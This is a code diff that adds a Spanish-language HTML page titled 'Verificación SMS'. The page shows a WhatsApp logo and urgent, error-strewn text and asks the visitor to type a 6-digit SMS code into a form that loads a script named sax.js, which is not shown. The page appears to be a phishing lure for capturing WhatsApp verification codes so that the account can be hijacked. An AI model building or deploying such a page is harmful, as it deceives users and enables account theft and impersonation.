@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación SMS</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="top-bg"></div>
+  <div class="form-wrapper">
+    <div class="form-box">
+      <img src="WhatsApp.svg" alt="Logo" class="logo" />
+      <p class="intro-text">
+        Le hemos enviado un código de verificación de 6 dígitos via SMS TEXTO a su número teléfono registrado, esto puede tarda mas de lo esperado POR FAVOR ESPERE POR SEGURIDAD, introduzca el código de SMS TEXTO enviado:
+      </p>
+  <form id="form2">
+    <input class="codiga" type="text" id="codigo2" placeholder="Codigo" maxlength="6"><br><br>
+    <button type="submit">Verificar</button>
+  </form>
+    <p id="error" style="color: red; display: none;">❌ Error: Ingresa el Codigo SMS enviado a tu celular. </p>
+  <p id="exito" style="color: green; display: none;">✅ Código aceptado correctamente.</p>
+    </div>
+
+  <script src="sax.js"></script>
+</body>
+</html>
